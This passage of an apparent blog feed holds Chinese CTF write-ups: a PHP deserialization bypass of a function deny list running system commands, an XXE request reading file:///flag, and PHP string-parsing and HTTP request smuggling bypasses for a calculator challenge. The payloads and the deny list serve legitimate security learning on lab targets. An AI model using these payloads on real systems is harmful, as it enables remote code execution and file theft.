class="number">5000</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;form  id=form1 name=form1 action=<span class="string">&quot;index.php&quot;</span> method=post&gt;</span><br><span class="line">    &lt;input type=hidden id=func name=func value=<span class="string">&#x27;date&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=hidden id=p name=p value=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一想到的就是反序列化了</p><p>这里并没有过滤serialize()函数,就可以造成反序列化,从而绕过disable_fun的检查</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line">    <span class="variable">$nacl</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$nacl</span>-&gt;p = <span class="string">&#x27;cat /tmp/flagoefiu4r93&#x27;</span>;</span><br><span class="line">    <span class="comment">//find / -name *flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查找flag:</p><p>func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:19:”find &#x2F; -name <em>flag</em>“;s:4:”func”;s:6:”system”;}</p><p>最终payload:</p><p>func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:22:”cat &#x2F;tmp&#x2F;flagoefiu4r93”;s:4:”func”;s:6:”system”;}</p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;</span><br><span class="line">    flag&#123;92146d45-0e57-40cc-a59b-8fd5c52bc35d&#125;</span><br><span class="line">flag&#123;92146d45-0e57-40cc-a59b-8fd5c52bc35d&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>还有一种方法是用<code>\system</code>绕过inarry的过滤</p><p>payload:</p><p>func&#x3D;\system&amp;p&#x3D;cat &#x2F;tmp&#x2F;flagoefiu4r93</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网鼎杯-2020-朱雀组-phpweb&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-朱雀组-phpweb&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 朱雀组]phpweb&quot;&gt;&lt;/a&gt;[网鼎杯 2020 朱雀组]phpweb&lt;/h1&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="buu刷题记录" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="php审计" scheme="http://example.com/tags/php%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>从一道题目中了解XXE漏洞</title>
    <link href="http://example.com/2024/01/13/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/01/13/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-01-13T12:41:17.000Z</published>
    <updated>2024-01-14T09:01:12.248Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>关于XXE漏洞参考:</p><p><a href="https://xz.aliyun.com/t/6887?time__1311=n4+xnD0DRDyB5AKDsYohhG5it0=7KqYqx">从XML相关一步一步到XXE漏洞</a></p><p>可以看见,这里回显了<code>&lt;uesrname&gt;&lt;/username&gt;</code>标签中的内容</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240114165435806.png" alt="image-20240114165435806"></p><p>故而构造payload,将这个位置输出改为任意文件读取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/doLogin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>76b8b4e7-f8b0-4c91-a92c-caaf7c02d684.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/xml, text/xml, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml;charset=utf-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>166</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://76b8b4e7-f8b0-4c91-a92c-caaf7c02d684.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://76b8b4e7-f8b0-4c91-a92c-caaf7c02d684.node5.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">nacl</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>nacl<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>得到flag:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 14 Jan 2024 08:52:55 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>85</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.4.0RC6</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="section">&lt;result&gt;</span><span class="section">&lt;code&gt;</span><span class="attribute">0</span>&lt;/code&gt;&lt;msg&gt;flag&#123;f6f20d58-f890-<span class="number">498</span>d-<span class="number">9938</span>-<span class="number">465594</span>f59376&#125;</span></span><br><span class="line"><span class="language-apache"><span class="section">&lt;/msg&gt;</span><span class="section">&lt;/result&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NCTF2019-Fake-XML-cookbook&quot;&gt;&lt;a href=&quot;#NCTF2019-Fake-XML-cookbook&quot; class=&quot;headerlink&quot; title=&quot;[NCTF2019]Fake XML cookbook&quot;&gt;&lt;/a&gt;[NCTF20</summary>
      
    
    
    
    <category term="XXE漏洞(XML外部实体注入)" scheme="http://example.com/categories/XXE%E6%BC%8F%E6%B4%9E-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="XXE漏洞(XML外部实体注入)" scheme="http://example.com/tags/XXE%E6%BC%8F%E6%B4%9E-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>从一个题目中了解http请求走私</title>
    <link href="http://example.com/2024/01/13/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>http://example.com/2024/01/13/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
    <published>2024-01-13T11:32:33.000Z</published>
    <updated>2024-01-13T12:24:27.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="RoarCTF 2019]Easy Calc"></a>RoarCTF 2019]Easy Calc</h1><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>之前做过这道题,但是是使用php字符串解析来绕过</p><p>关于php字符串解析特性:</p><p><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></p><p>并且还做了一些过滤黑字符,比如<code>/</code>和反引号等等</p><p>源码&#x2F;calc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>不过还是可以绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=var_dump(scandir(chr(47)))</span><br><span class="line">/calc.php?%20num=file_get_contents(chr(47).f1agg) </span><br></pre></td></tr></table></figure><p>chr将ascii码转换为字符</p><h3 id="方法二-http请求走私"><a href="#方法二-http请求走私" class="headerlink" title="方法二:http请求走私"></a>方法二:http请求走私</h3><p>这篇文章写的非常详细:</p><p><a href="https://xz.aliyun.com/t/6654?time__1311=n4+xnD0DRDBGitGk7rDsA3o+DcC+CN3DuiAYD">从一道题到协议层攻击之HTTP请求走私</a></p><p>使用CL-CL的方式使得前端服务器</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240113201605455.png" alt="image-20240113201605455"></p><p>按照<strong>RFC7230规范</strong>,此时应该返回400错误,前端服务器也确实做了,但是仍然将请求转发给了后端,使得前端服务器的waf被绕过</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href=&quot;#RoarCTF-2019-Easy-Calc&quot; class=&quot;headerlink&quot; title=&quot;RoarCTF 2019]Easy Calc&quot;&gt;&lt;/a&gt;RoarCTF 2019]Easy Ca</summary>
      
    
    
    
    <category term="buu刷题记录" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="http请求走私" scheme="http://example.com/tags/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    
  </entry>
  
</feed>
